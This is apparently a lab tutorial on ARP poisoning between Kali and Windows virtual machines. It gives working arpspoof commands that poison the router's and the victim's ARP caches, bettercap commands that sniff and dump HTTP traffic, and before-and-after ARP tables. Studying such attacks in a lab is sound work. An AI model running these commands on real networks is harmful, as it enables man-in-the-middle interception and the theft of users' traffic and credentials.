
ARP Poisoning (also called ARP Spoofing) is a **man-in-the-middle attack** that exploits the ARP (Address Resolution Protocol) to intercept network traffic between two devices. The attacker sends falsified ARP messages to link their MAC address with the IP address of a legitimate device, causing network traffic to be redirected through the attacker's machine.

**How it works:**

1. ARP is stateless and doesn't verify responses

2. Attackers send gratuitous ARP replies associating their MAC with target IPs

3. Network devices update their ARP caches with the fake mapping

4. Traffic flows through the attacker's machine (can be intercepted/modified)

----------
### Normal communication

```
Windows (Victim)  →  Router  →  Internet
```

### During ARP Poisoning

```
Windows (Victim) → Attacker (Linux) → Router → Internet
```

----------

## How to Perform (In VM):

We have two machines **Kali** (Attacker)  and  **Windows** (Victim)  machines.


Physical Address and IP of Windows System ---->

```
Physical Address. . . . . . . . . : 00-0C-29-5B-B9-15

 IPv4 Address. . . . . . . . . . . : 192.168.229.132
```


Physical Address and IP of Linux System ---->

```
ether 00:0c:29:f2:93:7b

inet 192.168.229.131
```

Router IP adress ---->

```
192.168.229.2
```

---------------
## Attack (In Kali) :

```
sudo arpspoof -i eth0 -t 192.168.229.2 192.168.229.132 
```

This command performs **ARP spoofing against the router** by sending fake ARP replies that map the **Windows victim’s IP address** to the **attacker’s MAC address**.

### What it achieves

- Poisons the **router’s ARP cache**

- Redirects packets meant for **Windows → Kali**

- Intercepts **incoming traffic** (router → victim)

```
sudo arpspoof -i eth0 -t 192.168.229.132 192.168.229.2
```

This command performs **ARP spoofing against the Windows victim** by sending fake ARP replies that map the **router’s IP address** to the **attacker’s MAC address**.

### What it achieves

- Poisons the **Windows ARP cache**

- Redirects packets meant for **router → Kali**

- Intercepts **outgoing traffic** (victim → router)


---

## Combined Effect (MITM)

When **both commands are run**, the attacker becomes a **Man-in-the-Middle**:

```
Windows ⇄ Kali (Attacker) ⇄ Router ⇄ Internet
```

------------
## Arp table (windows) :

### Before Attack ---->

```
C:\Users\SHELL>arp -a

Interface: 192.168.229.132 --- 0x5
  Internet Address      Physical Address      Type
  192.168.229.2         00-50-56-e3-be-e6     dynamic
  192.168.229.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

### After Attack ---->

```
C:\Users\SHELL>arp -a

Interface: 192.168.229.132 --- 0x5
  Internet Address      Physical Address      Type
  192.168.229.2         00-0c-29-f2-93-7b     dynamic
  192.168.229.131       00-0c-29-f2-93-7b     dynamic  (Attacker IP)
  192.168.229.254       00-50-56-ec-48-1a     dynamic
  192.168.229.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

------------
### Monitor Using bettercap Tool (kali):

```
sudo bettercap --iface eth0

help

net.probe on 
net.recon on
set event.http.response.dump true
set event.http.request.dump true
events.stream off
events.stream on
set net.sniff.local true 
net.sniff on 
```


#### Required :

```
sudo sysctl -w net.ipv4.ip_forward=1 
```

`net.ipv4.ip_forward=1` enables IP forwarding on a Linux system, allowing it to forward packets between network interfaces like a router.